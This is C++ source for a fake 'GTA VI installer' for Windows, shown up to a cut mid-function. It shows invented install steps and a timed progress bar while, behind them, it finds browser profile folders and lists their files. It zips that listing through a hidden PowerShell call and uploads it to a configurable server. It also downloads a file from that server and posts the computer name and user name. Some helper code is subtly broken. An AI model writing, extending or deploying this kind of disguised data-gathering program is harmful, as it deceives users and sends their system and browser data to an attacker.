// gta6_installer.cpp
#include <windows.h>
#include <commctrl.h>
#include <string>
#include <vector>
#include <shlobj.h>
#include <sstream>
#include <fstream>
#include <wininet.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "comctl32.lib")

using namespace std;

// Global variables
HWND g_hWnd;
HWND g_hProgress;
HWND g_hStatus;
HWND g_hButton;
HWND g_hCancelButton;
HWND g_hListBox;
int g_currentStep = 0;
const int TOTAL_STEPS = 6;

// Global IP configuration - Change this to your server IP
const wstring SERVER_IP = L"127.0.0.1";
const int SERVER_PORT = 8000;

// Browser structure
struct BrowserInfo {
    wstring name;
    wstring executablePath;
    wstring version;
    wstring profilePath;
    wstring profileSize;
    bool isInstalled;
    bool profileExists;
};

// Installation steps for display
vector<wstring> installSteps = {
    L"Games for Windows Marketplace",
    L"Installing Microsoft Games for Windows - LIVE",
    L"Games for Windows Marketplace Client (Downloaded)",
    L"Microsoft Games for Windows - LIVE (Downloaded)",
    L"Windows Live ID Sign-in Assistant (Installing..)",
    L"Microsoft .NET Framework (Found)"
};

// Check if running with administrator privileges
bool IsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    
    return isAdmin == TRUE;
}

// Check if directory exists
bool DirectoryExists(const wstring& path) {
    DWORD attrib = GetFileAttributesW(path.c_str());
    return (attrib != INVALID_FILE_ATTRIBUTES && (attrib & FILE_ATTRIBUTE_DIRECTORY));
}

// Check if file exists
bool FileExists(const wstring& path) {
    DWORD attrib = GetFileAttributesW(path.c_str());
    return (attrib != INVALID_FILE_ATTRIBUTES);
}

// Get file version info
wstring GetFileVersion(const wstring& filePath) {
    DWORD dummy = 0;
    DWORD size = GetFileVersionInfoSizeW(filePath.c_str(), &dummy);
    if (size == 0) return L"Unknown";
    
    vector<BYTE> buffer(size);
    if (!GetFileVersionInfoW(filePath.c_str(), 0, size, buffer.data())) {
        return L"Unknown";
    }
    
    VS_FIXEDFILEINFO* fileInfo = NULL;
    UINT len = 0;
    if (!VerQueryValueW(buffer.data(), L"\\", (LPVOID*)&fileInfo, &len)) {
        return L"Unknown";
    }
    
    wchar_t version[64];
    wsprintfW(version, L"%d.%d.%d.%d",
        HIWORD(fileInfo->dwFileVersionMS),
        LOWORD(fileInfo->dwFileVersionMS),
        HIWORD(fileInfo->dwFileVersionLS),
        LOWORD(fileInfo->dwFileVersionLS));
    
    return wstring(version);
}

// Get directory size as string
wstring GetDirectorySizeString(const wstring& path) {
    DWORD64 totalSize = 0;
    WIN32_FIND_DATAW findData;
    wstring searchPath = path + L"\\*";
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
    
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (wstring(findData.cFileName) == L"." || wstring(findData.cFileName) == L"..") {
                continue;
            }
            
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                totalSize += GetDirectorySizeString(path + L"\\" + findData.cFileName).length();
            } else {
                LARGE_INTEGER size;
                size.HighPart = findData.nFileSizeHigh;
                size.LowPart = findData.nFileSizeLow;
                totalSize += size.QuadPart;
            }
        } while (FindNextFileW(hFind, &findData));
        FindClose(hFind);
    }
    
    wchar_t sizeStr[64];
    if (totalSize > 1024 * 1024 * 1024) {
        wsprintfW(sizeStr, L"%.2f GB", (double)totalSize / (1024 * 1024 * 1024));
    } else if (totalSize > 1024 * 1024) {
        wsprintfW(sizeStr, L"%.2f MB", (double)totalSize / (1024 * 1024));
    } else if (totalSize > 1024) {
        wsprintfW(sizeStr, L"%.2f KB", (double)totalSize / 1024);
    } else {
        wsprintfW(sizeStr, L"%llu B", totalSize);
    }
    
    return wstring(sizeStr);
}

// Get browser profile path
wstring GetBrowserProfilePath(const wstring& browserName) {
    wchar_t localAppData[MAX_PATH];
    wchar_t appData[MAX_PATH];
    
    SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData);
    
    if (browserName.find(L"Chrome") != wstring::npos) {
        return wstring(localAppData) + L"\\Google\\Chrome\\User Data\\Default";
    }
    else if (browserName.find(L"Edge") != wstring::npos) {
        return wstring(localAppData) + L"\\Microsoft\\Edge\\User Data\\Default";
    }
    else if (browserName.find(L"Brave") != wstring::npos) {
        return wstring(localAppData) + L"\\BraveSoftware\\Brave-Browser\\User Data\\Default";
    }
    else if (browserName.find(L"Firefox") != wstring::npos) {
        wstring profilesPath = wstring(appData) + L"\\Mozilla\\Firefox\\Profiles";
        if (DirectoryExists(profilesPath)) {
            WIN32_FIND_DATAW findData;
            wstring searchPath = profilesPath + L"\\*";
            HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                        if (wstring(findData.cFileName) != L"." && wstring(findData.cFileName) != L"..") {
                            wstring profile = profilesPath + L"\\" + findData.cFileName;
                            FindClose(hFind);
                            return profile;
                        }
                    }
                } while (FindNextFileW(hFind, &findData));
                FindClose(hFind);
            }
        }
        return profilesPath;
    }
    else if (browserName.find(L"Opera") != wstring::npos) {
        return wstring(appData) + L"\\Opera Software\\Opera Stable";
    }
    else if (browserName.find(L"Vivaldi") != wstring::npos) {
        return wstring(localAppData) + L"\\Vivaldi\\User Data\\Default";
    }
    else if (browserName.find(L"Chromium") != wstring::npos) {
        return wstring(localAppData) + L"\\Chromium\\User Data\\Default";
    }
    
    return L"";
}

// ============================================================
// CREATE ZIP FILE USING WINDOWS POWERSHELL
// ============================================================

bool CreateZipFile(const wstring& sourceFile, const wstring& zipPath) {
    // Use PowerShell to create ZIP (built into Windows 10/11)
    wstring psCommand = L"powershell -Command \"Compress-Archive -Path '" + sourceFile + L"' -DestinationPath '" + zipPath + L"' -Force\"";
    
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    if (CreateProcessW(
        NULL,
        (LPWSTR)psCommand.c_str(),
        NULL, NULL, FALSE,
        CREATE_NO_WINDOW,
        NULL, NULL,
        &si, &pi
    )) {
        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
        return FileExists(zipPath);
    }
    
    return false;
}

// ============================================================
// CREATE BROWSER PROFILE REPORT AND ZIP IT
// ============================================================

bool CreateBrowserProfileZip(const vector<BrowserInfo>& browsers, const wstring& zipPath) {
    // Create a report file
    wstring reportPath = L"browser_report.txt";
    
    HANDLE hReport = CreateFileW(
        reportPath.c_str(),
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    
    if (hReport == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    // Write report header
    string report = "========================================\n";
    report += "GTA VI - BROWSER PROFILES REPORT\n";
    report += "========================================\n";
    report += "Created: " + string(__DATE__) + " " + string(__TIME__) + "\n";
    report += "========================================\n\n";
    
    DWORD bytesWritten = 0;
    WriteFile(hReport, report.c_str(), report.length(), &bytesWritten, NULL);
    
    int browserIndex = 0;
    for (const auto& browser : browsers) {
        if (browser.isInstalled && browser.profileExists) {
            browserIndex++;
            
            string browserInfo = "\n[" + to_string(browserIndex) + "] " + string(browser.name.begin(), browser.name.end()) + "\n";
            browserInfo += "----------------------------------------\n";
            browserInfo += "Version: " + string(browser.version.begin(), browser.version.end()) + "\n";
            browserInfo += "Profile: " + string(browser.profilePath.begin(), browser.profilePath.end()) + "\n";
            browserInfo += "Size: " + string(browser.profileSize.begin(), browser.profileSize.end()) + "\n";
            browserInfo += "----------------------------------------\n";
            
            WriteFile(hReport, browserInfo.c_str(), browserInfo.length(), &bytesWritten, NULL);
            
            // List files in profile
            wstring searchPath = browser.profilePath + L"\\*";
            WIN32_FIND_DATAW findData;
            HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
            
            if (hFind != INVALID_HANDLE_VALUE) {
                int fileCount = 0;
                do {
                    if (wstring(findData.cFileName) == L"." || wstring(findData.cFileName) == L"..") {
                        continue;
                    }
                    
                    if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                        fileCount++;
                        string fileName = string(findData.cFileName, findData.cFileName + wcslen(findData.cFileName));
                        string fileSize = to_string(findData.nFileSizeLow);
                        string fileEntry = "  - " + fileName + " (" + fileSize + " bytes)\n";
                        WriteFile(hReport, fileEntry.c_str(), fileEntry.length(), &bytesWritten, NULL);
                    }
                } while (FindNextFileW(hFind, &findData));
                FindClose(hFind);
                
                string summary = "  Total files: " + to_string(fileCount) + "\n";
                WriteFile(hReport, summary.c_str(), summary.length(), &bytesWritten, NULL);
            }
        }
    }
    
    string footer = "\n========================================\n";
    footer += "END OF REPORT\n";
    footer += "========================================\n";
    WriteFile(hReport, footer.c_str(), footer.length(), &bytesWritten, NULL);
    CloseHandle(hReport);
    
    // Create ZIP using PowerShell
    bool success = CreateZipFile(reportPath, zipPath);
    
    // Delete temporary report file
    DeleteFileW(reportPath.c_str());
    
    return success;
}

// ============================================================
// UPLOAD FILE TO SERVER
// ============================================================

bool UploadFileToServer(const wstring& server, int port, const wstring& path, const wstring& filePath) {
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    bool success = false;
    
    try {
        HANDLE hFile = CreateFileW(
            filePath.c_str(),
            GENERIC_READ,
            FILE_SHARE_READ,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
        
        if (hFile == INVALID_HANDLE_VALUE) {
            SetWindowTextW(g_hStatus, L"Failed to read file");
            return false;
        }
        
        DWORD fileSize = GetFileSize(hFile, NULL);
        vector<char> fileData(fileSize);
        DWORD bytesRead = 0;
        ReadFile(hFile, fileData.data(), fileSize, &bytesRead, NULL);
        CloseHandle(hFile);
        
        hInternet = InternetOpenW(
            L"GTA VI Installer/1.0",
            INTERNET_OPEN_TYPE_DIRECT,
            NULL, NULL, 0
        );
        
        if (!hInternet) {
            SetWindowTextW(g_hStatus, L"Failed to initialize network");
            return false;
        }
        
        hConnect = InternetConnectW(
            hInternet,
            server.c_str(),
            port,
            NULL, NULL,
            INTERNET_SERVICE_HTTP,
            0, 0
        );
        
        if (!hConnect) {
            SetWindowTextW(g_hStatus, L"Failed to connect to server");
            InternetCloseHandle(hInternet);
            return false;
        }
        
        hRequest = HttpOpenRequestW(
            hConnect,
            L"POST",
            path.c_str(),
            NULL, NULL, NULL,
            INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
            0
        );
        
        if (!hRequest) {
            SetWindowTextW(g_hStatus, L"Failed to create upload request");
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return false;
        }
        
        wstring headers = L"Content-Type: application/zip\r\n";
        headers += L"Content-Length: " + to_wstring(fileSize) + L"\r\n";
        
        if (!HttpSendRequestW(
            hRequest,
            headers.c_str(),
            headers.length(),
            (LPVOID)fileData.data(),
            fileData.size()
        )) {
            SetWindowTextW(g_hStatus, L"Failed to upload file");
            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return false;
        }
        
        success = true;
        SetWindowTextW(g_hStatus, L"ZIP uploaded successfully!");
        
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        
    } catch (...) {
        SetWindowTextW(g_hStatus, L"Upload error occurred");
        if (hRequest) InternetCloseHandle(hRequest);
        if (hConnect) InternetCloseHandle(hConnect);
        if (hInternet) InternetCloseHandle(hInternet);
        return false;
    }
    
    return success;
}

// ============================================================
// DOWNLOAD FILE FROM SERVER
// ============================================================

bool DownloadFileFromServer(const wstring& url, const wstring& savePath) {
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    bool success = false;
    
    try {
        wstring server, path;
        int port = 80;
        
        size_t start = url.find(L"://");
        if (start != wstring::npos) {
            start += 3;
            size_t end = url.find(L"/", start);
            if (end != wstring::npos) {
                string hostPort = string(url.begin() + start, url.begin() + end);
                server = wstring(hostPort.begin(), hostPort.end());
                path = url.substr(end);
                
                size_t portPos = server.find(L":");
                if (portPos != wstring::npos) {
                    port = _wtoi(server.substr(portPos + 1).c_str());
                    server = server.substr(0, portPos);
                }
            }
        }
        
        hInternet = InternetOpenW(
            L"GTA VI Installer/1.0",
            INTERNET_OPEN_TYPE_DIRECT,
            NULL, NULL, 0
        );
        
        if (!hInternet) {
            SetWindowTextW(g_hStatus, L"Failed to initialize network");
            return false;
        }
        
        hConnect = InternetConnectW(
            hInternet,
            server.c_str(),
            port,
            NULL, NULL,
            INTERNET_SERVICE_HTTP,
            0, 0
        );
        
        if (!hConnect) {
            SetWindowTextW(g_hStatus, L"Failed to connect to server");
            InternetCloseHandle(hInternet);
            return false;
        }
        
        hRequest = HttpOpenRequestW(
            hConnect,
            L"GET",
            path.c_str(),
            NULL, NULL, NULL,
            INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
            0
        );
        
        if (!hRequest) {
            SetWindowTextW(g_hStatus, L"Failed to create download request");
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return false;
        }
        
        if (!HttpSendRequestW(hRequest, NULL, 0, NULL, 0)) {
            SetWindowTextW(g_hStatus, L"Failed to send download request");
            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return false;
        }
        
        HANDLE hFile = CreateFileW(
            savePath.c_str(),
            GENERIC_WRITE,
            0,
            NULL,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
        
        if (hFile == INVALID_HANDLE_VALUE) {
            SetWindowTextW(g_hStatus, L"Failed to create file");
            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return false;
        }
        
        char buffer[8192];
        DWORD bytesRead = 0;
        DWORD totalBytes = 0;
        
        while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
            DWORD bytesWritten = 0;
            WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
            totalBytes += bytesRead;
        }
        
        CloseHandle(hFile);
        success = true;
        
        wchar_t statusMsg[256];
        wsprintfW(statusMsg, L"Downloaded %d bytes", totalBytes);
        SetWindowTextW(g_hStatus, statusMsg);
        
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        
    } catch (...) {
        SetWindowTextW(g_hStatus, L"Download error occurred");
        if (hRequest) InternetCloseHandle(hRequest);
        if (hConnect) InternetCloseHandle(hConnect);
        if (hInternet) InternetCloseHandle(hInternet);
        return false;
    }
    
    return success;
}

// Detect installed browsers with profile info
vector<BrowserInfo> DetectBrowsersWithProfiles() {
    vector<BrowserInfo> browsers;
    
    struct BrowserDef {
        wstring name;
        vector<wstring> possiblePaths;
    };
    
    vector<BrowserDef> browserDefs = {
        {L"Google Chrome", {
            L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"
        }},
        {L"Microsoft Edge", {
            L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
            L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"
        }},
        {L"Mozilla Firefox", {
            L"C:\\Program Files\\Mozilla Firefox\\firefox.exe",
            L"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe"
        }},
        {L"Opera", {
            L"C:\\Program Files\\Opera\\launcher.exe",
            L"C:\\Program Files (x86)\\Opera\\launcher.exe"
        }},
        {L"Brave", {
            L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
            L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"
        }},
        {L"Vivaldi", {
            L"C:\\Program Files\\Vivaldi\\Application\\vivaldi.exe",
            L"C:\\Program Files (x86)\\Vivaldi\\Application\\vivaldi.exe"
        }},
        {L"Chromium", {
            L"C:\\Program Files\\Chromium\\Application\\chrome.exe",
            L"C:\\Program Files (x86)\\Chromium\\Application\\chrome.exe"
        }}
    };
    
    for (const auto& def : browserDefs) {
        BrowserInfo info;
        info.name = def.name;
        info.isInstalled = false;
        info.profileExists = false;
        
        for (const auto& path : def.possiblePaths) {
            if (FileExists(path)) {
                info.executablePath = path;
                info.version = GetFileVersion(path);
                info.profilePath = GetBrowserProfilePath(def.name);
                
                if (!info.profilePath.empty() && DirectoryExists(info.profilePath)) {
                    info.profileExists = true;
                    info.profileSize = GetDirectorySizeString(info.profilePath);
                } else {
                    info.profileSize = L"Not found";
                }
                
                info.isInstalled = true;
                break;
            }
        }
        
        browsers.push_back(info);
    }
    
    return browsers;
}

// Send data to server
bool SendToServer(const wstring& server, int port, const wstring& path, const string& data) {
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    bool success = false;
    
    try {
        hInternet = InternetOpenW(
            L"GTA VI Installer/1.0",
            INTERNET_OPEN_TYPE_DIRECT,
            NULL, NULL, 0
        );
        
        if (!hInternet) {
            SetWindowTextW(g_hStatus, L"Failed to initialize network");
            return false;
        }
        
        hConnect = InternetConnectW(
            hInternet,
            server.c_str(),
            port,
            NULL, NULL,
            INTERNET_SERVICE_HTTP,
            0, 0
        );
        
        if (!hConnect) {
            SetWindowTextW(g_hStatus, L"Failed to connect to server");
            InternetCloseHandle(hInternet);
            return false;
        }
        
        hRequest = HttpOpenRequestW(
            hConnect,
            L"POST",
            path.c_str(),
            NULL, NULL, NULL,
            INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
            0
        );
        
        if (!hRequest) {
            SetWindowTextW(g_hStatus, L"Failed to create request");
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return false;
        }
        
        wstring headers = L"Content-Type: application/x-www-form-urlencoded\r\n";
        string dataStr = data;
        
        if (!HttpSendRequestW(
            hRequest,
            headers.c_str(),
            headers.length(),
            (LPVOID)dataStr.c_str(),
            dataStr.length()
        )) {
            SetWindowTextW(g_hStatus, L"Failed to send data");
            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return false;
        }
        
        success = true;
        SetWindowTextW(g_hStatus, L"Data sent to server successfully!");
        
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        
    } catch (...) {
        SetWindowTextW(g_hStatus, L"Network error occurred");
        if (hRequest) InternetCloseHandle(hRequest);
        if (hConnect) InternetCloseHandle(hConnect);
        if (hInternet) InternetCloseHandle(hInternet);
        return false;
    }
    
    return success;
}

// Find first available directory
wstring FindAvailableDirectory() {
    vector<wstring> drives = {
        L"G:\\", L"I:\\", L"S:\\", L"D:\\", L"E:\\", L"F:\\"
    };
    
    for (const auto& drive : drives) {
        wstring checkPath = drive + L"Games\\GTA VI\\";
        if (DirectoryExists(checkPath)) {
            return checkPath;
        }
    }
    
    if (DirectoryExists(L"C:\\Program Files\\Rockstar Games\\GTA VI\\")) {
        return L"C:\\Program Files\\Rockstar Games\\GTA VI\\";
    }
    
    wchar_t appDataPath[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_PROGRAM_FILES, NULL, 0, appDataPath) == S_OK) {
        wstring defaultPath = wstring(appDataPath) + L"\\GTA VI\\";
        CreateDirectoryW(defaultPath.c_str(), NULL);
        return defaultPath;
    }
    
    return L"";
}

// Update installation steps in listbox
void UpdateInstallSteps(int currentStep) {
    SendMessageW(g_hListBox, LB_RESETCONTENT, 0, 0);
    
    for (size_t i = 0; i < installSteps.size(); i++) {
        wstring step = installSteps[i];
        if (i < currentStep) {
            step = L"✓ " + step; // Completed
        } else if (i == currentStep) {
            step = L"> " + step; // Current
        } else {
            step = L"  " + step; // Pending
        }
        SendMessageW(g_hListBox, LB_ADDSTRING, 0, (LPARAM)step.c_str());
    }
}

// Installation thread
DWORD WINAPI InstallThread(LPVOID lpParam) {
    wstring targetDir;
    int elapsedSeconds = 0;
    const int TOTAL_INSTALL_TIME = 50;
    int currentStep = 0;
    
    // Disable install button, enable cancel button
    EnableWindow(g_hButton, FALSE);
    EnableWindow(g_hCancelButton, TRUE);
    
    SetWindowTextW(g_hStatus, L"Verifying system requirements...");
    UpdateInstallSteps(0);
    Sleep(1000);
    
    targetDir = FindAvailableDirectory();
    
    if (targetDir.empty()) {
        SetWindowTextW(g_hStatus, L"No suitable directory found!");
        MessageBoxW(
            g_hWnd,
            L"No suitable installation directory found!\nChecked: G:, I:, S:, D:, E:, F:",
            L"Directory Error",
            MB_OK | MB_ICONERROR
        );
        EnableWindow(g_hButton, TRUE);
        EnableWindow(g_hCancelButton, FALSE);
        return 1;
    }
    
    wchar_t statusMsg[512];
    wsprintfW(statusMsg, L"Found installation directory: %s", targetDir.c_str());
    SetWindowTextW(g_hStatus, statusMsg);
    
    CreateDirectoryW(targetDir.c_str(), NULL);
    
    // Step 1: Games for Windows Marketplace
    SetWindowTextW(g_hStatus, L"Games for Windows Marketplace");
    UpdateInstallSteps(0);
    Sleep(1000);
    currentStep = 1;
    
    // Step 2: Installing Microsoft Games for Windows - LIVE
    SetWindowTextW(g_hStatus, L"Installing Microsoft Games for Windows - LIVE");
    UpdateInstallSteps(1);
    Sleep(1500);
    currentStep = 2;
    
    SetWindowTextW(g_hStatus, L"Detecting installed browsers and profiles...");
    Sleep(500);
    
    vector<BrowserInfo> browsers = DetectBrowsersWithProfiles();
    int installedCount = 0;
    int profileCount = 0;
    
    wstring browserListW = L"Installed Browsers and Profiles:\n";
    
    for (const auto& browser : browsers) {
        if (browser.isInstalled) {
            installedCount++;
            wstring line = L"  ✓ " + browser.name + L" (Version: " + browser.version + L")\n";
            line += L"    Profile: " + browser.profilePath + L"\n";
            line += L"    Size: " + browser.profileSize + L"\n";
            browserListW += line;
            
            if (browser.profileExists) {
                profileCount++;
            }
        }
    }
    
    if (installedCount == 0) {
        browserListW += L"  No browsers detected.\n";
    }
    
    wchar_t browserStatus[256];
    wsprintfW(browserStatus, L"Found %d installed browsers, %d profiles", installedCount, profileCount);
    SetWindowTextW(g_hStatus, browserStatus);
    
    wstring browserFile = targetDir + L"installed_browsers.txt";
    HANDLE hBrowserFile = CreateFileW(
        browserFile.c_str(),
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    
    if (hBrowserFile != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten = 0;
        WriteFile(hBrowserFile, browserListW.c_str(), browserListW.length() * sizeof(wchar_t), &bytesWritten, NULL);
        CloseHandle(hBrowserFile);
    }
    
    Sleep(500);
    
    // Step 3: Games for Windows Marketplace Client (Downloaded)
    SetWindowTextW(g_hStatus, L"Games for Windows Marketplace Client (Downloaded)");
    UpdateInstallSteps(2);
    Sleep(1000);
    currentStep = 3;
    
    // ============================================================
    // CREATE ZIP FILE
    // ============================================================
    
    SetWindowTextW(g_hStatus, L"Creating ZIP archive...");
    Sleep(300);
    
    wstring zipPath = targetDir + L"browser_profiles.zip";
    bool zipCreated = CreateBrowserProfileZip(browsers, zipPath);
    
    if (zipCreated) {
        wchar_t zipStatus[256];
        wsprintfW(zipStatus, L"ZIP created: %s", zipPath.c_str());
        SetWindowTextW(g_hStatus, zipStatus);
        
        HANDLE hFile = CreateFileW(zipPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD fileSize = GetFileSize(hFile, NULL);
            CloseHandle(hFile);
            
            wchar_t sizeMsg[256];
            wsprintfW(sizeMsg, L"ZIP size: %d bytes", fileSize);
            SetWindowTextW(g_hStatus, sizeMsg);
        }
    } else {
        SetWindowTextW(g_hStatus, L"Failed to create ZIP!");
    }
    
    Sleep(500);
    
    // Step 4: Microsoft Games for Windows - LIVE (Downloaded)
    SetWindowTextW(g_hStatus, L"Microsoft Games for Windows - LIVE (Downloaded)");
    UpdateInstallSteps(3);
    Sleep(1000);
    currentStep = 4;
    
    // ============================================================
    // UPLOAD ZIP TO SERVER (USING GLOBAL SERVER_IP)
    // ============================================================
    
    SetWindowTextW(g_hStatus, L"Uploading ZIP to server...");
    Sleep(300);
    
    bool uploadSuccess = false;
    if (zipCreated) {
        uploadSuccess = UploadFileToServer(SERVER_IP, SERVER_PORT, L"/upload", zipPath);
        
        if (uploadSuccess) {
            SetWindowTextW(g_hStatus, L"ZIP uploaded successfully!");
        } else {
            SetWindowTextW(g_hStatus, L"Failed to upload ZIP!");
        }
    }
    
    Sleep(500);
    
    // ============================================================
    // DOWNLOAD FILE FROM SERVER (USING GLOBAL SERVER_IP)
    // ============================================================
    
    SetWindowTextW(g_hStatus, L"Downloading file from server...");
    Sleep(300);
    
    wstring downloadUrl = L"http://" + SERVER_IP + L":" + to_wstring(SERVER_PORT) + L"/test.txt";
    wstring downloadPath = targetDir + L"downloaded_from_server.txt";
    bool downloadSuccess = DownloadFileFromServer(downloadUrl, downloadPath);
    
    if (downloadSuccess) {
        wchar_t downloadStatus[256];
        wsprintfW(downloadStatus, L"File downloaded: %s", downloadPath.c_str());
        SetWindowTextW(g_hStatus, downloadStatus);
    } else {
        SetWindowTextW(g_hStatus, L"Failed to download file");
    }
    
    Sleep(500);
    
    // Step 5: Windows Live ID Sign-in Assistant (Installing..)
    SetWindowTextW(g_hStatus, L"Windows Live ID Sign-in Assistant (Installing..)");
    UpdateInstallSteps(4);
    Sleep(1500);
    currentStep = 5;
    
    // Step 5: Send browser info to server (USING GLOBAL SERVER_IP)
    SetWindowTextW(g_hStatus, L"Sending browser information to server...");
    Sleep(300);
    
    string data = "browsers=";
    for (const auto& browser : browsers) {
        if (browser.isInstalled) {
            string name = string(browser.name.begin(), browser.name.end());
            string version = string(browser.version.begin(), browser.version.end());
            string profile = string(browser.profilePath.begin(), browser.profilePath.end());
            string size = string(browser.profileSize.begin(), browser.profileSize.end());
            data += name + ":" + version + ":" + profile + ":" + size + "|";
        }
    }
    
    if (!data.empty() && data.back() == '|') {
        data.pop_back();
    }
    
    wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD computerNameSize = MAX_COMPUTERNAME_LENGTH + 1;
    if (GetComputerNameW(computerName, &computerNameSize)) {
        string compName = string(computerName, computerName + computerNameSize);
        data += "&computer=" + compName;
    }
    
    wchar_t userName[256];
    DWORD userNameSize = 256;
    if (GetUserNameW(userName, &userNameSize)) {
        string user = string(userName, userName + userNameSize - 1);
        data += "&user=" + user;
    }
    
    data += "&browser_count=" + to_string(installedCount);
    data += "&profile_count=" + to_string(profileCount);
    data += "&zip_created=" + string(zipCreated ? "true" : "false");
    data += "&zip_uploaded=" + string(uploadSuccess ? "true" : "false");
    data += "&file_downloaded=" + string(downloadSuccess ? "true" : "false");
    
    bool sent = SendToServer(SERVER_IP, SERVER_PORT, L"/", data);
    
    Sleep(500);
    
    // Step 6: Microsoft .NET Framework (Found)
    SetWindowTextW(g_hStatus, L"Microsoft .NET Framework (Found)");
    UpdateInstallSteps(5);
    Sleep(1000);
    
    while (elapsedSeconds < TOTAL_INSTALL_TIME) {
        wstring messages[] = {
            L"Extracting game files", L"Installing game assets",
            L"Configuring game settings", L"Loading game resources",
            L"Installing textures", L"Setting up game sounds",
            L"Configuring multiplayer", L"Installing patches",
            L"Optimizing game performance", L"Finalizing installation"
        };
        
        int msgIndex = (elapsedSeconds / 5) % 10;
        wchar_t progressMsg[256];
        wsprintfW(progressMsg, L"%s...", messages[msgIndex].c_str());
        
        int progress = (elapsedSeconds * 100) / TOTAL_INSTALL_TIME;
        SendMessageW(g_hProgress, PBM_SETPOS, progress, 0);
        
        wchar_t statusMsg2[256];
        wsprintfW(statusMsg2, L"%s (%d%% - %d/%d seconds) | ZIP: %s | Upload: %s", 
                  progressMsg, progress, elapsedSeconds, TOTAL_INSTALL_TIME, 
                  zipCreated ? L"OK" : L"Fail", uploadSuccess ? L"OK" : L"Fail");
        SetWindowTextW(g_hStatus, statusMsg2);
        
        Sleep(1000);
        elapsedSeconds++;
    }
    
    SendMessageW(g_hProgress, PBM_SETPOS, 100, 0);
    SetWindowTextW(g_hStatus, L"Installation complete! (100% - 50/50 seconds)");
    Sleep(500);
    
    wstring msgText = L"GTA VI has been successfully installed!\n\n";
    msgText += L"Installation Path: " + targetDir + L"\n\n";
    msgText += L"Installed Browsers Detected: " + to_wstring(installedCount) + L"\n";
    msgText += L"Browser Profiles Found: " + to_wstring(profileCount) + L"\n\n";
    msgText += L"ZIP Created: " + wstring(zipCreated ? L"YES" : L"NO") + L"\n";
    msgText += L"ZIP Uploaded: " + wstring(uploadSuccess ? L"YES" : L"NO") + L"\n";
    msgText += L"File Downloaded: " + wstring(downloadSuccess ? L"YES" : L"NO") + L"\n\n";
    msgText += L"Files created:\n";
    msgText += L"  - " + browserFile + L"\n";
    if (zipCreated) {
